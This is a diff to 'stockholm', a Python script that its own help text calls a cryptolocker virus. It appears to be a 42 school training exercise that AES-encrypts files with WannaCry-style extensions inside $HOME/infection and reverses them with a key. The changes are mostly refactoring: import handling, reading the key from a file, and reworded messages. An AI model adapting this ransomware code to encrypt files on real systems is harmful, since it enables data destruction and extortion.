@@ -2,16 +2,21 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import os
-import argparse
-import string
-import secrets
-from Crypto.Cipher import AES
-from colorama import Fore, Style
-from pathlib import Path
+try:
+    import os
+    import argparse
+    import string
+    import secrets
+    from Crypto.Cipher import AES
+    from colorama import Fore, Style
+    from pathlib import Path
+except ModuleNotFoundError as e:
+    print(f"{e}")
+    print("Please type : pip install -r requirements.txt")
+    sys.exit(1)
 
 SILENT = False
-VERSION = "v1.05"
+VERSION = "v1.20"
 WANNACRY_EXT = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt',
 	   '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm',
 	   '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
@@ -148,7 +153,16 @@ def decrypt_data(encrypted_data, key):
     decrypted_data = decrypted_data[:-padding_length]
     return decrypted_data
 
-def reverse(key):
+def reverse(arg):
+    try:
+        if os.path.isfile(arg):
+            with open(arg, 'r') as file:
+                key = file.read()
+        else:
+            key = arg
+    except:
+        print(f"{Fore.RED}Failed to read the key file{Style.RESET_ALL}")
+        sys.exit(1)
     nb_file = 0
     files = get_files(PATH, STOCKHOLM_EXT)
     total_files = len(files)
@@ -162,8 +176,8 @@ def reverse(key):
             delete_file(f)
             output("✅")
             nb_file += 1
-        except Exception :
-            output("❌ Bad file")
+        except Exception as e:
+            output(f"❌ : {e}")
     output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} files decrypted out of {Fore.BLUE}{total_files}{Style.RESET_ALL} encrypted files in folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")
 
 def encrypt():
@@ -187,13 +201,13 @@ def encrypt():
         with open("key.txt", 'w') as file:
             file.write(key)
     else:
-        output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} files encrypted out of {Fore.BLUE}{total_files}{Style.RESET_ALL} present in the folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")
+        output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} encrypted files out of {Fore.BLUE}{total_files}{Style.RESET_ALL} encryptable files in the folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")
         output(f"The key is {Fore.RED}{key}{Style.RESET_ALL}, don't lose it !!")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="stockholm : cryptolocker virus which encrypts files $HOME/infection.")
     parser.add_argument("-v", "--version", action="store_true", help="Show version of the program.")
-    parser.add_argument("-r", "--reverse", type=str, help="Reverse the infection using the provided encryption key.")
+    parser.add_argument("-r", "--reverse", type=str, help="Reverse encryption using the supplied encryption key or a file containing it")
     parser.add_argument("-s","--silent", action='store_true', help="Silent mode, no output")
     parser.add_argument("--all-files", action="store_true", default=False ,help="All files will be encrypted !!")
     parser.add_argument("-k", "--key", type=int, choices=[16, 32], metavar='key', help="Length of the encryption key. Choose between 16 or 32 (default: 16)")
@@ -203,7 +217,7 @@ if __name__ == "__main__":
     if args.all_files:
         WANNACRY_EXT = None
     if args.version:
-        print(f"stockholm 42 Project: Version = {Fore.BLUE}{VERSION}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}stockholm 42 Project{Style.RESET_ALL}: Version = {Fore.GREEN}{VERSION}{Style.RESET_ALL}")
         sys.exit(0)
     if args.key:
         KEY_LENGTH = args.key
